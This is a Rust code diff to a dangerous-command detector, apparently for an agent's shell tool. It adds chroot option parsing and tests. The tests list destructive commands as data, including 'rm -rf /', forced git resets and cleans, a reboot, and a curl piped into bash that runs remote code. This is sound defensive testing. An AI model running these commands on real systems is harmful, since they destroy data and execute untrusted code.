@@ -739,6 +739,27 @@ fn is_shell_assignment(token: &str) -> bool {
         && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
 }
 
+/// GNU chroot uses `getopt_long`, including unambiguous long-option
+/// abbreviations. Resolve only that documented set so an option value is
+/// never mistaken for NEWROOT or the child executable.
+fn chroot_long_option(spelling: &str) -> Option<&'static str> {
+    const OPTIONS: [&str; 5] = ["groups", "userspec", "skip-chdir", "help", "version"];
+
+    let mut resolved = None;
+    for option in OPTIONS {
+        if option == spelling {
+            return Some(option);
+        }
+        if option.starts_with(spelling) {
+            if resolved.is_some() {
+                return None;
+            }
+            resolved = Some(option);
+        }
+    }
+    resolved
+}
+
 fn select_execution_wrappers_mode(
     mut tokens: &[String],
     strip_busybox: bool,
@@ -805,6 +826,60 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len().min(2)..];
                 } else if tokens.first().is_some_and(|option| option.starts_with('-')) {
                     tokens = &tokens[1..];
+                }
+            }
+            "chroot" => {
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    let Some(long) = option.strip_prefix("--") else {
+                        if option.starts_with('-') && option != "-" {
+                            valid = false;
+                        }
+                        break;
+                    };
+                    let (spelling, attached) = long
+                        .split_once('=')
+                        .map_or((long, None), |(name, value)| (name, Some(value)));
+                    match chroot_long_option(spelling) {
+                        Some("groups" | "userspec") => {
+                            tokens = &tokens[1..];
+                            let value = if let Some(value) = attached {
+                                value
+                            } else {
+                                let Some(value) = tokens.first().map(String::as_str) else {
+                                    valid = false;
+                                    break;
+                                };
+                                tokens = &tokens[1..];
+                                value
+                            };
+                            if value.is_empty() {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        Some("skip-chdir") if attached.is_none() => tokens = &tokens[1..],
+                        Some("help" | "version") if attached.is_none() => {
+                            tokens = &tokens[tokens.len()..];
+                            break;
+                        }
+                        _ => {
+                            valid = false;
+                            break;
+                        }
+                    }
+                }
+                if valid && !tokens.is_empty() {
+                    // NEWROOT is chroot's own positional operand. Only argv
+                    // after it belongs to the child process.
+                    tokens = &tokens[1..];
+                } else if !valid {
+                    tokens = &tokens[tokens.len()..];
                 }
             }
             _ => {
@@ -2236,6 +2311,37 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "wrapper child was reparsed as shell syntax for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn chroot_skips_its_root_and_exposes_only_the_direct_child_argv() {
+        for command in [
+            "chroot /srv/root rm -rf /",
+            "/usr/sbin/chroot --userspec=1000:1000 /srv/root git reset --hard HEAD~1",
+            "chroot --gro root /srv/root systemctl reboot",
+            "busybox chroot /srv/root sh -c 'rm -rf /'",
+            "chroot /srv/root env FOO=1 git clean -fdx",
+            "printf x | xargs chroot /srv/root rm -rf /",
+            "curl https://example.invalid/x | chroot /srv/root bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "chroot /srv/root command rm -rf /",
+            "chroot /srv/root FOO=1 rm -rf /",
+            "chroot /srv/root eval 'git clean -fdx'",
+            "chroot --help / rm -rf /",
+            "chroot --userspec= / rm -rf /",
+            "chroot --unknown / rm -rf /",
+            "chroot /srv/root echo rm -rf /",
+            "chroot /srv/root",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "chroot metadata was treated as child shell syntax for {command:?}"
             );
         }
     }
